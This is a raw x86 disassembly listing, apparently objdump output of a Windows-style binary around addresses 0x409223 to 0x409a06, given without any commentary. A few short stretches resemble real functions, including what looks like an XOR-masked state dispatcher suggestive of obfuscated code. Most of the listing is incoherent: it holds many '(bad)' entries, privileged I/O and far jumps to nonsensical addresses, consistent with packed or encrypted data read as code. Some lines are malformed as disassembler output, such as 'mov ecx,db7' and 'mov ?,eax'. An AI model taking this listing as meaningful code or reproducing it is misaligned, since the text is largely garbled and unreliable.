  409223:	mov    ebp,0x2b60f690
  409228:	pop    eax
  409229:	push   es
  40922a:	jmp    DWORD PTR [edi-0x72]
  40922d:	sub    al,BYTE PTR [ebp+edi*2-0x79]
  409231:	mov    edx,0x7e4ccfd4
  409236:	push   0x39620006
  40923b:	out    dx,eax
  40923c:	sar    dh,cl
  40923e:	lock scas eax,DWORD PTR es:[edi]
  409240:	je     0x4092bb
  409242:	xor    dl,ah
  409244:	mov    al,ds:0x87ef50df
  409249:	jmp    0xd10b:0x21a276e0
  409250:	dec    ecx
  409251:	fmul   st,st(0)
  409253:	imul   edi,DWORD PTR [esi+ecx*1-0x3cfc39cd],0x8dac4589
  40925e:	inc    ebp
  40925f:	in     al,0x89
  409261:	inc    ebp
  409262:	mov    al,0x8b
  409264:	inc    ebp
  409265:	mov    al,ds:0xc303c633
  40926a:	mov    DWORD PTR [ebp-0x60],eax
  40926d:	lea    eax,[ebp-0x60]
  409270:	push   eax
  409271:	mov    eax,DWORD PTR [ebp+0xc]
  409274:	xor    eax,esi
  409276:	add    eax,ebx
  409278:	push   eax
  409279:	mov    eax,ds:0x414b1e
  40927e:	push   0x414a74
  409283:	push   DWORD PTR [eax]
  409285:	call   0x411333
  40928a:	jmp    0x4092c1
  40928f:	cmp    edi,0x13c
  409295:	jne    0x4092c1
  40929b:	mov    eax,DWORD PTR [ebp-0x10]
  40929e:	xor    eax,esi
  4092a0:	add    eax,ebx
  4092a2:	mov    DWORD PTR [ebp+0x8],eax
  4092a5:	mov    eax,ds:0x414afe
  4092aa:	mov    DWORD PTR [ebp+0x8],eax
  4092ad:	mov    eax,DWORD PTR [ebp-0x14]
  4092b0:	mov    DWORD PTR [ebp-0x4],eax
  4092b3:	mov    eax,DWORD PTR [ebp-0x4]
  4092b6:	push   0x4
  4092b8:	pop    ecx
  4092b9:	sub    ecx,eax
  4092bb:	add    ecx,DWORD PTR [ebp-0x18]
  4092be:	mov    DWORD PTR [ebp-0x8],ecx
  4092c1:	mov    eax,DWORD PTR [ebp+0xc]
  4092c4:	xor    eax,esi
  4092c6:	lea    edi,[edi+eax*1+0x327299]
  4092cd:	cmp    edi,0x50a
  4092d3:	jne    0x4089c6
  4092d9:	mov    eax,DWORD PTR [ebp+0xc]
  4092dc:	pop    edi
  4092dd:	xor    eax,esi
  4092df:	pop    esi
  4092e0:	add    eax,ebx
  4092e2:	pop    ebx
  4092e3:	leave  
  4092e4:	ret    0x8
  4092e7:	push   ebp
  4092e8:	mov    ebp,esp
  4092ea:	sub    esp,0x44
  4092ed:	push   edi
  4092ee:	adc    DWORD PTR ds:0x434637,ebx
  4092f4:	mov    eax,DWORD PTR [ebp+0xc]
  4092f7:	mov    DWORD PTR [ebp-0x10],eax
  4092fa:	and    DWORD PTR ds:0x43463b,0x5787
  409304:	jmp    0x40971b
  409309:	jns    0x4092bd
  40930b:	out    dx,al
  40930c:	std    
  40930d:	jge    0x40938c
  40930f:	or     eax,0x11d61472
  409314:	clc    
  409315:	or     DWORD PTR [edi-0x49],edx
  409318:	add    eax,0x7e7ee292
  40931d:	jo     0x409398
  40931f:	jle    0x40939f
  409321:	lods   eax,DWORD PTR ds:[esi]
  409322:	and    ebx,edi
  409324:	iret   
  409325:	xchg   edi,eax
  409326:	sub    ch,BYTE PTR [esi-0x57]
  409329:	pusha  
  40932a:	out    0xf4,al
  40932c:	cmp    esp,DWORD PTR [edx-0x7a]
  40932f:	(bad)  
  409331:	popf   
  409332:	fstp   TBYTE PTR [edi]
  409334:	in     eax,dx
  409335:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409336:	aad    0x8c
  409338:	xor    al,0xc6
  40933a:	js     0x409368
  40933c:	in     al,0x99
  40933e:	jno    0x4092ea
  409340:	and    BYTE PTR [esi+0x64],cl
  409343:	and    edx,ebx
  409345:	or     eax,0x6fcde766
  40934a:	outs   dx,BYTE PTR ds:[esi]
  40934b:	stc    
  40934c:	or     edi,DWORD PTR [edi+0x7fe7f1db]
  409352:	fcmovu st,st(5)
  409354:	jmp    0x2c8e3312
  409359:	fdivr  DWORD PTR [ebp-0x5f]
  40935c:	iret   
  40935d:	in     al,dx
  40935e:	xor    DWORD PTR [ebx-0x5004e6c5],ebp
  409364:	and    al,0x1d
  409366:	test   eax,0xa7683110
  40936b:	outs   dx,DWORD PTR ds:[esi]
  40936c:	mov    al,ds:0x4cfb5881
  409371:	mov    eax,fs:0xd46054ac
  409377:	int3   
  409378:	inc    esp
  409379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40937a:	shr    DWORD PTR [edx],0xa
  40937d:	lahf   
  40937e:	sbb    BYTE PTR [eax],bl
  409380:	mov    ds,WORD PTR [edx]
  409382:	imul   eax,DWORD PTR [ebx-0x5e072fe0],0xffffffb8
  409389:	fmul   DWORD PTR [edx-0x7cff5d39]
  40938f:	inc    esp
  409390:	sbb    bh,dh
  409392:	inc    ebx
  409393:	mov    BYTE PTR ss:[ecx-0x71],bl
  409397:	inc    ebp
  409398:	cli    
  409399:	pop    esp
  40939a:	dec    edx
  40939b:	popf   
  40939c:	xchg   BYTE PTR [edi+ebx*1],ch
  40939f:	ret    
  4093a0:	cwde   
  4093a1:	(bad)  
  4093a2:	sub    al,0x81
  4093a4:	imul   ebp,DWORD PTR [ebx+0x7bd182cf],0x6e0b9614
  4093ae:	lods   al,BYTE PTR ds:[esi]
  4093af:	ss cmc 
  4093b1:	jbe    0xcb52345e
  4093b7:	or     eax,0xb5fb7812
  4093bc:	sahf   
  4093bd:	mov    BYTE PTR [eax+0x16],cl
  4093c0:	xor    DWORD PTR [edx-0x6098ab4f],ebx
  4093c6:	cli    
  4093c7:	push   ecx
  4093c8:	inc    ebx
  4093c9:	add    esp,ebp
  4093cb:	nop
  4093cc:	adc    esi,DWORD PTR [edx+0x34]
  4093cf:	push   esp
  4093d0:	fidivr DWORD PTR [edi+eax*8]
  4093d3:	mov    dl,BYTE PTR [ebx+edi*1]
  4093d6:	fnstsw WORD PTR [ebx+0x65262f2e]
  4093dc:	test   eax,0x48c188df
  4093e1:	push   ss
  4093e2:	pop    edi
  4093e3:	stos   DWORD PTR es:[edi],eax
  4093e4:	jmp    0x4093c1
  4093e6:	popf   
  4093e7:	inc    ecx
  4093e8:	dec    ebp
  4093e9:	mov    al,0x74
  4093eb:	je     0x40939e
  4093ed:	xor    esi,0x74
  4093f0:	inc    ecx
  4093f1:	fstp   TBYTE PTR [edx+ebp*8]
  4093f4:	xor    esp,eax
  4093f6:	std    
  4093f7:	push   ebx
  4093f8:	pop    ebp
  4093f9:	mov    bl,0xcc
  4093fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093fc:	mov    ah,0xa3
  4093fe:	pushf  
  4093ff:	popf   
  409400:	imul   ebx,DWORD PTR [ecx+0x10],0xffffffb0
  409404:	test   eax,0x7fdefa77
  409409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40940a:	das    
  40940b:	lea    esi,[edx+ebx*2-0x33]
  40940f:	mov    ecx,db7
  409412:	xor    eax,0x7f2980d2
  409417:	dec    ecx
  409418:	add    al,0xe9
  40941a:	push   edi
  40941b:	xor    BYTE PTR [ebx+0x2d21bfaa],cl
  409421:	jns    0x409434
  409423:	into   
  409424:	aad    0x2c
  409426:	pusha  
  409427:	hlt    
  409428:	pop    ds
  409429:	push   edx
  40942a:	(bad)  
  40942b:	repz jmp 0x409483
  40942e:	into   
  40942f:	fdivr  QWORD PTR [ecx-0x7b]
  409432:	adc    bh,BYTE PTR [ecx]
  409434:	add    eax,ebp
  409436:	fldenv [esi-0x6ee6a7ae]
  40943c:	std    
  40943d:	add    DWORD PTR [eax+0x3f],ebx
  409440:	cld    
  409441:	or     eax,DWORD PTR [edx-0x57]
  409444:	leave  
  409445:	unpckhps xmm5,XMMWORD PTR [ebx]
  409448:	lahf   
  409449:	add    bh,BYTE PTR [esi-0x2b]
  40944c:	jb     0x409405
  40944e:	int3   
  40944f:	icebp  
  409450:	mov    ebx,DWORD PTR [ecx-0x1d]
  409453:	inc    ebx
  409454:	jmp    0x4093de
  409456:	dec    ecx
  409457:	jbe    0x409427
  409459:	inc    ebx
  40945a:	(bad)  
  40945b:	lea    eax,[ebx-0x40]
  40945e:	push   edi
  40945f:	ret    
  409460:	lea    ecx,[edx]
  409462:	fwait
  409463:	ins    BYTE PTR es:[edi],dx
  409464:	cdq    
  409465:	cmp    edi,DWORD PTR [eax-0x117491f5]
  40946b:	cmp    esp,DWORD PTR [ebx-0x1a]
  40946e:	push   es
  40946f:	mov    edi,0x9e1afc6e
  409474:	push   es
  409475:	pusha  
  409476:	call   DWORD PTR [edx-0x5d]
  409479:	sub    DWORD PTR [edx],0xcfb0acff
  40947f:	jne    0x40949a
  409481:	xor    eax,0xc2d03179
  409486:	mov    edx,DWORD PTR [esi-0x27579d57]
  40948c:	cmp    DWORD PTR [ebp+0x67],ecx
  40948f:	sbb    BYTE PTR [eax-0x73],0x1
  409493:	xchg   BYTE PTR ds:0xbe9f5a38,dh
  409499:	not    DWORD PTR [edi]
  40949b:	in     eax,dx
  40949c:	test   al,0x86
  40949e:	push   es
  40949f:	into   
  4094a0:	cmp    edx,ecx
  4094a2:	inc    esp
  4094a3:	jae    0x4094cf
  4094a5:	jecxz  0x4094a0
  4094a7:	add    dl,al
  4094a9:	mov    bh,ch
  4094ab:	adc    esp,DWORD PTR [edx-0x3b]
  4094ae:	mov    bh,0x8
  4094b0:	ds sti 
  4094b2:	shl    BYTE PTR [edi+0x53ae52d0],1
  4094b8:	(bad)  
  4094b9:	scas   al,BYTE PTR es:[edi]
  4094ba:	jo     0x4094bf
  4094bc:	aaa    
  4094bd:	fadd   st,st(4)
  4094bf:	jae    0x40947a
  4094c1:	(bad)  
  4094c2:	cmp    eax,0x32cc81d
  4094c7:	pop    ss
  4094c8:	imul   eax,DWORD PTR fs:[esi-0x7],0x499e0fe4
  4094d0:	xor    bh,bl
  4094d2:	cdq    
  4094d3:	cmp    al,0xc4
  4094d5:	(bad)  
  4094d6:	pop    ebp
  4094d7:	mov    ?,eax
  4094d9:	sbb    al,0xcc
  4094db:	or     eax,0x8b1f1572
  4094e0:	push   ecx
  4094e1:	inc    esp
  4094e2:	retf   
  4094e3:	push   ebp
  4094e4:	out    0xa1,eax
  4094e6:	into   
  4094e7:	retf   0x1e1c
  4094ea:	out    0x82,eax
  4094ec:	jne    0x409507
  4094ee:	xlat   BYTE PTR ds:[ebx]
  4094ef:	sbb    BYTE PTR [esi+0x1abfeda2],bh
  4094f5:	out    dx,eax
  4094f6:	test   DWORD PTR [ecx+0x63],ecx
  4094f9:	je     0x409500
  4094fb:	cmp    BYTE PTR [ebp-0x20],cl
  4094fe:	ficomp WORD PTR [ebp+0x6f]
  409501:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409502:	out    dx,al
  409503:	mov    ebx,0x9e727c25
  409508:	xchg   ecx,eax
  409509:	fld    DWORD PTR [ebx+0x574c9cc8]
  40950f:	daa    
  409510:	push   es
  409511:	jns    0x4094f6
  409513:	lods   al,BYTE PTR ds:[esi]
  409514:	ja     0x4094d3
  409516:	adc    eax,0x1bcee1ce
  40951b:	add    ebp,edi
  40951d:	mov    bl,0xd5
  40951f:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409521:	cmp    dh,BYTE PTR [ecx]
  409523:	push   cs
  409524:	fisubr DWORD PTR [ecx-0x19]
  409527:	sub    eax,0x6c8903a7
  40952c:	sbb    BYTE PTR [ebx+0x27],al
  40952f:	inc    esp
  409530:	add    ah,BYTE PTR [ecx-0x54]
  409533:	add    ch,bh
  409535:	js     0x409557
  409537:	sub    eax,0xdb900580
  40953c:	sti    
  40953d:	pop    ss
  40953e:	sbb    DWORD PTR [esi],esi
  409540:	mov    BYTE PTR [eax],bh
  409542:	into   
  409543:	cdq    
  409544:	mov    cl,0x17
  409546:	(bad)  
  409547:	(bad)  
  409549:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40954b:	pop    ebx
  40954c:	nop
  40954d:	not    DWORD PTR [ebx+esi*1]
  409550:	ret    
  409551:	mov    esi,0xbf78fba3
  409556:	jg     0x409537
  409558:	mov    esp,0x8221edc3
  40955d:	call   0xd9380791
  409562:	shl    bl,1
  409564:	mov    ds:0x3677b122,eax
  409569:	add    eax,0x1b008cd3
  40956e:	push   ebp
  40956f:	scas   eax,DWORD PTR es:[edi]
  409570:	xchg   DWORD PTR [ebp-0x5],esp
  409573:	stos   DWORD PTR es:[edi],eax
  409574:	out    dx,eax
  409575:	sub    eax,0x11a1e899
  40957a:	outs   dx,DWORD PTR ds:[esi]
  40957b:	outs   dx,BYTE PTR ds:[esi]
  40957c:	inc    edi
  40957d:	retf   
  40957e:	data16 or ah,BYTE PTR [eax-0x59]
  409582:	pop    ecx
  409583:	arpl   WORD PTR [ebp+esi*4+0xbfdbb80],bx
  40958a:	fwait
  40958b:	adc    al,0x44
  40958d:	test   BYTE PTR [esi],0x52
  409590:	xchg   edx,eax
  409591:	outs   dx,BYTE PTR ds:[esi]
  409592:	adc    eax,0xbe424b53
  409597:	sahf   
  409598:	jl     0x409545
  40959a:	jge    0x4095a0
  40959c:	push   ebp
  40959d:	or     ebp,DWORD PTR [eax]
  40959f:	es leave 
  4095a1:	mov    al,0x75
  4095a3:	inc    ecx
  4095a4:	inc    esi
  4095a5:	popa   
  4095a6:	sahf   
  4095a7:	mov    ah,0x6e
  4095a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095aa:	fimul  DWORD PTR [esi-0x544443ee]
  4095b0:	sub    DWORD PTR [esi+0x225c6692],ecx
  4095b6:	mov    bh,0xc2
  4095b8:	and    BYTE PTR [ecx-0x48b78976],al
  4095be:	lds    edi,FWORD PTR [ecx]
  4095c0:	out    dx,al
  4095c1:	mov    bh,0x9
  4095c3:	jg     0x40963b
  4095c5:	aaa    
  4095c6:	pop    esi
  4095c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095c8:	mov    ch,0x7f
  4095ca:	outs   dx,DWORD PTR ds:[esi]
  4095cb:	push   es
  4095cc:	(bad)  
  4095cd:	mov    dl,0x71
  4095cf:	fdivr  DWORD PTR [edx-0x73]
  4095d2:	and    al,BYTE PTR [edi+0x3d9d86b5]
  4095d8:	rcl    BYTE PTR [ecx+ebx*8-0x6c7511ed],1
  4095df:	or     al,0x7a
  4095e1:	and    al,0x12
  4095e3:	push   esi
  4095e4:	xor    esp,esi
  4095e6:	mov    ah,0xee
  4095e8:	(bad)
  4095eb:	mov    al,ds:0x87619470
  4095f0:	xor    DWORD PTR [ebx-0x54],0x1c
  4095f4:	shl    bh,0xdc
  4095f7:	and    bh,bl
  4095f9:	jmp    0xd3ed:0xca8f05cb
  409600:	jmp    0x1fdc:0x546271e5
  409607:	sbb    ah,BYTE PTR [ebx+eax*1+0x40eb8b6]
  40960e:	out    dx,al
  40960f:	ret    
  409610:	dec    eax
  409611:	and    ebx,esp
  409613:	cmp    dl,bh
  409615:	dec    esp
  409616:	call   0x1505:0x8f96476
  40961d:	bswap  ebx
  40961f:	mov    ch,0x8a
  409621:	loop   0x4095f4
  409623:	call   0xa2908a53
  409628:	lods   eax,DWORD PTR ds:[esi]
  409629:	mov    dl,0xb6
  40962b:	pop    ebp
  40962c:	loope  0x40961d
  40962e:	push   eax
  40962f:	sub    al,0x30
  409631:	push   0xe32f7f6c
  409636:	xor    DWORD PTR [ebx+0x64],edx
  409639:	push   0x50e494d1
  40963e:	test   eax,0x7baa3e58
  409643:	xchg   edx,eax
  409644:	aam    0x37
  409646:	fs stos DWORD PTR es:[edi],eax
  409648:	sub    eax,0x8291d2e5
  40964d:	ret    0xc45b
  409650:	inc    edx
  409651:	clc    
  409652:	icebp  
  409653:	add    dl,BYTE PTR [ebx+0x56c8b4]
  409659:	outs   dx,DWORD PTR ds:[esi]
  40965a:	or     eax,0x47fdbe08
  40965f:	jecxz  0x4095e3
  409661:	(bad)  
  409662:	mov    eax,es
  409664:	inc    ebp
  409665:	and    al,dh
  409667:	daa    
  409668:	icebp  
  409669:	or     al,BYTE PTR [esi]
  40966b:	push   0x3f
  40966d:	mov    edi,0x85e7360f
  409672:	ja     0x409618
  409674:	mov    ah,bh
  409676:	jl     0x40961c
  409678:	adc    ch,BYTE PTR [ebp-0x5a4eb9e4]
  40967e:	das    
  40967f:	in     eax,0xa0
  409681:	stos   BYTE PTR es:[edi],al
  409682:	adc    al,0xd9
  409684:	aam    0x55
  409686:	sbb    edx,DWORD PTR [edx+0x5d]
  409689:	out    dx,al
  40968a:	add    BYTE PTR [eax-0x19],al
  40968d:	xor    eax,0x8076cbf8
  409692:	or     dh,BYTE PTR [ebx+edi*1]
  409695:	repz sbb BYTE PTR [eax+0x59ff1642],cl
  40969c:	cmp    BYTE PTR [edi-0x56],0x1a
  4096a0:	iret   
  4096a1:	cmc    
  4096a2:	pop    ecx
  4096a3:	jb     0x409683
  4096a5:	xor    DWORD PTR [bp+di],edx
  4096a8:	(bad)  
  4096a9:	pop    ecx
  4096aa:	sub    bl,bl
  4096ac:	xchg   esi,eax
  4096ad:	cmp    bl,BYTE PTR [ecx]
  4096af:	test   BYTE PTR [edi],ah
  4096b1:	add    bl,BYTE PTR [eax+0x49fbe6fc]
  4096b7:	enter  0x63bc,0x28
  4096bb:	je     0x40971f
  4096bd:	adc    eax,0x8aa6be08
  4096c2:	jbe    0x409675
  4096c4:	repz add esp,edi
  4096c7:	add    DWORD PTR [edi+0x37734082],eax
  4096cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096ce:	adc    bh,bh
  4096d0:	and    al,0xb8
  4096d2:	fadd   st,st(4)
  4096d4:	hlt    
  4096d5:	imul   edx,DWORD PTR [eax+0x7a908ae1],0x56
  4096dc:	xor    ebp,DWORD PTR [ebx+0x1db2d7df]
  4096e2:	dec    ecx
  4096e3:	out    0xab,eax
  4096e5:	fnstsw WORD PTR [eax-0x22]
  4096e8:	aad    0x13
  4096ea:	adc    esi,DWORD PTR [ebp-0xe]
  4096ed:	xor    edx,DWORD PTR [edi+0x11]
  4096f0:	aad    0xc8
  4096f2:	fldenv ds:[ebp+0x13]
  4096f6:	adc    edx,ebp
  4096f8:	jge    0x4096f8
  4096fa:	inc    esp
  4096fb:	imul   DWORD PTR [eax+0xbda6fdc]
  409701:	test   DWORD PTR ds:0x7630dadb,esp
  409707:	div    al
  409709:	iret   
  40970a:	push   ss
  40970b:	mov    ebx,cs
  40970d:	test   al,0x14
  40970f:	mov    ds,WORD PTR ds:0x4edf033a
  409715:	pop    ebp
  409716:	(bad)  
  409717:	push   esi
  409718:	mov    ebp,0x458bb9de
  40971d:	or     BYTE PTR [ebx+0x43470f3d],cl
  409723:	add    BYTE PTR [ecx],cl
  409725:	cmp    eax,0x434713
  40972a:	mov    DWORD PTR [ebp+0x8],0xf89c8536
  409731:	xor    edi,0x551
  409737:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40973e:	movzx  ecx,WORD PTR ds:0x4345f3
  409745:	add    ecx,DWORD PTR ds:0x434637
  40974b:	mov    DWORD PTR ds:0x4345f3,ecx
  409751:	mov    edx,DWORD PTR [ebp+0x8]
  409754:	jmp    0x409b6b
  409759:	jmp    0x409767
  40975b:	or     al,0xd8
  40975d:	std    
  40975e:	fdiv   st,st(3)
  409760:	sbb    eax,0x3c00db39
  409765:	xor    edi,ebx
  409767:	call   0x7f2f2c04
  40976c:	jle    0x4097de
  40976e:	jns    0x4097ee
  409770:	jle    0x40975c
  409772:	test   BYTE PTR ds:0x3a25b36c,dh
  409778:	bound  ebx,QWORD PTR [eax+0x7f]
  40977b:	call   0xb638:0x8fb260e
  409782:	aaa    
  409783:	mov    esi,0x7a863d44
  409788:	jno    0x4097a4
  40978a:	adc    al,0xf4
  40978c:	icebp  
  40978d:	dec    ebp
  40978e:	cdq    
  40978f:	or     BYTE PTR [ebx],ch
  409791:	fnsave [edi]
  409793:	and    al,0x4f
  409795:	xchg   DWORD PTR [ecx+0x5c6fd80f],ebx
  40979b:	pop    edx
  40979c:	aam    0x73
  40979e:	in     al,dx
  40979f:	retf   
  4097a0:	(bad)  
  4097a1:	std    
  4097a2:	jae    0x4097c1
  4097a4:	xlat   BYTE PTR ds:[ebx]
  4097a5:	or     dl,BYTE PTR [eax+0x69]
  4097a8:	idiv   ebp
  4097aa:	jg     0x40978c
  4097ac:	pop    edi
  4097ad:	jl     0x40975a
  4097af:	stc    
  4097b0:	cs (bad) 
  4097b2:	pusha  
  4097b3:	stos   BYTE PTR es:[edi],al
  4097b4:	jge    0x4097d9
  4097b6:	(bad)  
  4097b7:	in     eax,0xa1
  4097b9:	arpl   WORD PTR [edx-0x1a],sp
  4097bc:	sub    BYTE PTR [ebx+0x32],0x52
  4097c0:	jl     0x409745
  4097c2:	nop
  4097c3:	sbb    bh,bl
  4097c5:	and    ebx,DWORD PTR [ecx]
  4097c7:	sub    edx,DWORD PTR ds:0x9170db2c
  4097cd:	jge    0x40976b
  4097cf:	std    
  4097d0:	clc    
  4097d1:	in     eax,dx
  4097d2:	in     al,0xfe
  4097d4:	jne    0x40983e
  4097d6:	sbb    dl,dl
  4097d8:	hlt    
  4097d9:	repnz cs pushf 
  4097dc:	jae    0x409828
  4097de:	inc    edi
  4097df:	ins    BYTE PTR es:[edi],dx
  4097e0:	jl     0x409827
  4097e2:	sbb    ch,dl
  4097e4:	xchg   BYTE PTR [esi+eiz*2-0x3d],ah
  4097e8:	shr    DWORD PTR [esi-0xf461e5b],0x65
  4097ef:	xor    bl,0x57
  4097f2:	mov    dl,0xd1
  4097f4:	aad    0xfd
  4097f6:	mov    eax,ds:0x4dfb2c6b
  4097fb:	cwde   
  4097fc:	ds std 
  4097fe:	sbb    cl,dl
  409800:	or     BYTE PTR [edx],ch
  409802:	jmp    0x40980f
  409804:	test   ecx,esi
  409806:	or     al,0x94
  409808:	xor    al,0x8f
  40980a:	rcr    DWORD PTR [edx],1
  40980c:	mov    DWORD PTR [ecx+esi*1-0x7b],ebp
  409810:	loope  0x409858
  409812:	jnp    0x409880
  409814:	adc    al,0x29
  409816:	pushw  0x2f20
  40981a:	ret    
  40981b:	aas    
  40981c:	inc    edx
  40981d:	mov    cl,0x8a
  40981f:	fs nop
  409821:	inc    esp
  409822:	sub    al,0x50
  409824:	inc    ebp
  409825:	test   eax,0xadf2460e
  40982a:	pop    edx
  40982b:	push   ds
  40982c:	jmp    0x8bb1:0xc828d94b
  409833:	stc    
  409834:	mov    al,ds:0x266a4dca
  409839:	popa   
  40983a:	jmp    0xbae5:0x88cbc957
  409841:	fidivr DWORD PTR [ecx+ebx*2]
  409844:	add    BYTE PTR ds:0x7265ec4c,bh
  40984a:	mov    ah,0x64
  40984c:	jbe    0x40983f
  40984e:	and    BYTE PTR [ebx+0x74],ah
  409851:	mov    ?,WORD PTR [ebx]
  409853:	push   ecx
  409854:	add    al,0x2b
  409856:	(bad)  [ecx-0xe10bdc]
  40985c:	call   0xbdbcd808
  409861:	hlt    
  409862:	mov    dh,0x2c
  409864:	loopne 0x40984a
  409866:	scas   eax,DWORD PTR es:[edi]
  409867:	jl     0x4098c1
  409869:	cmp    al,0x7f
  40986b:	cs cli 
  40986d:	cmp    dl,BYTE PTR [ebx]
  40986f:	mov    bl,0x8d
  409871:	and    BYTE PTR [ebx],ah
  409873:	popa   
  409874:	sbb    cl,ch
  409876:	xchg   esp,eax
  409877:	(bad)  
  409878:	adc    eax,0xe7cb1e08
  40987d:	test   BYTE PTR [edi],bh
  40987f:	test   al,0xf
  409881:	cmp    ch,ah
  409883:	pop    ecx
  409884:	xor    DWORD PTR [ebp+0x4df849e3],ebx
  40988a:	cmp    eax,0xb289300e
  40988f:	sbb    DWORD PTR [esi-0x3a],esi
  409892:	mov    dh,0x8b
  409894:	xchg   edi,eax
  409895:	mov    WORD PTR fs:[eax-0xe91a9c4],es
  40989c:	pop    edx
  40989d:	stos   DWORD PTR es:[edi],eax
  40989e:	loope  0x40985d
  4098a0:	push   cs
  4098a1:	jae    0x40991b
  4098a3:	int    0x16
  4098a5:	xchg   ecx,eax
  4098a6:	sub    BYTE PTR [ebp-0x72],bh
  4098a9:	xor    bh,al
  4098ab:	outs   dx,BYTE PTR ds:[esi]
  4098ac:	imul   esp,DWORD PTR [ebx+0x5a],0x724a82ac
  4098b3:	sbb    eax,0x26325497
  4098b8:	ror    BYTE PTR [ebp-0xd79d59d],0x58
  4098bf:	inc    eax
  4098c0:	jo     0x4098cd
  4098c2:	mov    ch,0xe8
  4098c4:	inc    ebp
  4098c5:	test   al,0x46
  4098c7:	dec    ebx
  4098c8:	mov    al,0x15
  4098ca:	ins    BYTE PTR es:[edi],dx
  4098cb:	push   cs
  4098cc:	scas   eax,DWORD PTR es:[edi]
  4098cd:	imul   BYTE PTR [esi-0x7e]
  4098d0:	out    0x6f,eax
  4098d2:	in     al,dx
  4098d3:	pop    es
  4098d4:	inc    esp
  4098d5:	fs (bad) 
  4098d8:	jg     0x409865
  4098da:	ja     0x4098f5
  4098dc:	repnz cli 
  4098de:	mov    bh,0x55
  4098e0:	lods   eax,DWORD PTR ds:[esi]
  4098e1:	jge    0x409878
  4098e3:	pop    edx
  4098e4:	push   esi
  4098e5:	lods   eax,DWORD PTR ds:[esi]
  4098e6:	push   esi
  4098e7:	aam    0x88
  4098e9:	loop   0x4098f2
  4098eb:	pop    esp
  4098ec:	(bad)  
  4098ed:	aas    
  4098ee:	jecxz  0x40989f
  4098f0:	inc    ebp
  4098f1:	loop   0x40992a
  4098f3:	cs and al,0xda
  4098f6:	ins    BYTE PTR es:[edi],dx
  4098f7:	xor    BYTE PTR [ebx-0x98f99e5],bl
  4098fd:	lods   al,BYTE PTR ds:[esi]
  4098fe:	push   es
  4098ff:	add    ebp,DWORD PTR [eax]
  409901:	sub    DWORD PTR [ebp-0x29],ecx
  409904:	push   ds
  409905:	dec    ecx
  409906:	shl    BYTE PTR gs:[eax-0x35],cl
  40990a:	inc    ebx
  40990b:	pop    edi
  40990c:	cmp    ebp,edx
  40990e:	(bad)  
  40990f:	push   0x8c96866d
  409914:	pop    esi
  409915:	cmp    dh,BYTE PTR [edx+0x39]
  409918:	call   DWORD PTR [ebx-0x62]
  40991b:	cmp    eax,0xd304b0d6
  409920:	cld    
  409921:	pop    edx
  409922:	(bad)  
  409923:	ds fmul st(5),st
  409926:	fidivr WORD PTR [esi-0x3ff9184b]
  40992c:	hlt    
  40992d:	xor    eax,DWORD PTR [ebp+edi*4-0x13]
  409931:	sbb    BYTE PTR [eax],0x22
  409934:	push   0x6c
  409936:	sub    BYTE PTR [ecx-0x47],bl
  409939:	and    eax,0x5b67057b
  40993e:	retf   
  40993f:	sub    DWORD PTR [eax],ebp
  409941:	add    ebx,DWORD PTR [esi]
  409943:	dec    edx
  409944:	pop    es
  409945:	push   0xffffffdf
  409947:	xchg   DWORD PTR [eax],eax
  409949:	push   ebp
  40994a:	pop    esi
  40994b:	pusha  
  40994c:	aam    0x1
  40994e:	xchg   esp,eax
  40994f:	xchg   ebx,eax
  409950:	test   BYTE PTR [ebx-0x3f5f37d8],bl
  409956:	mov    esi,edi
  409958:	test   eax,0x53d233f1
  40995d:	cwde   
  40995e:	into   
  40995f:	popf   
  409960:	jnp    0x40993c
  409962:	push   es
  409963:	frstor [edi-0xbe02bf4]
  409969:	inc    eax
  40996a:	mov    esi,DWORD PTR [ebp-0x76]
  40996d:	out    dx,al
  40996e:	js     0x4099ca
  409970:	pop    ss
  409971:	or     eax,0x1e9ecb94
  409976:	pusha  
  409977:	add    al,0xb3
  409979:	cmc    
  40997a:	mov    dh,0xec
  40997c:	mov    eax,0x2f6111
  409981:	and    al,BYTE PTR ds:0xca465e5e
  409987:	mov    dh,0x52
  409989:	dec    esp
  40998a:	xchg   ebp,eax
  40998b:	das    
  40998c:	fisub  DWORD PTR [esi+0x64]
  40998f:	adc    ecx,ebp
  409991:	dec    ebp
  409992:	jmp    0x9162117f
  409997:	lahf   
  409998:	je     0x4099e1
  40999a:	pop    ds
  40999b:	imul   ecx,ebp,0x97e1a367
  4099a1:	pop    ebx
  4099a2:	(bad)  
  4099a3:	pop    esi
  4099a4:	or     edx,DWORD PTR [ecx+edx*8+0x7d]
  4099a8:	aam    0x64
  4099aa:	pop    ebp
  4099ab:	xor    dl,dl
  4099ad:	mov    edi,0x36efd7b7
  4099b2:	dec    esp
  4099b3:	or     BYTE PTR [esi-0x17543f1],cl
  4099b9:	inc    ecx
  4099ba:	gs popf 
  4099bc:	retf   0xf3e2
  4099bf:	ret    
  4099c0:	lock dec esp
  4099c2:	pop    ds
  4099c3:	jbe    0x4099ba
  4099c5:	stos   DWORD PTR es:[edi],eax
  4099c6:	or     BYTE PTR [edi-0x44],cl
  4099c9:	(bad)  [ebx+eax*8+0x515d3895]
  4099d0:	out    dx,al
  4099d1:	mov    edx,edi
  4099d3:	popa   
  4099d4:	push   ds
  4099d5:	cmp    al,0xd3
  4099d7:	enter  0xdb4b,0x50
  4099db:	fdiv   st(2),st
  4099dd:	hlt    
  4099de:	inc    esp
  4099df:	adc    eax,0xdb192aa1
  4099e4:	sub    esi,edx
  4099e6:	inc    ebx
  4099e7:	push   cs
  4099e8:	push   es
  4099e9:	mov    edi,0x299aab7c
  4099ee:	addr16 push di
  4099f1:	adc    al,0x7d
  4099f3:	dec    esp
  4099f4:	out    dx,eax
  4099f5:	call   0x942b:0x63808fc0
  4099fc:	add    BYTE PTR [eax+0x74],al
  4099ff:	fst    QWORD PTR [ebx]
  409a01:	add    eax,0x6ef4cc13
  409a06:	xor    DWORD PTR [eax+0x1],edx
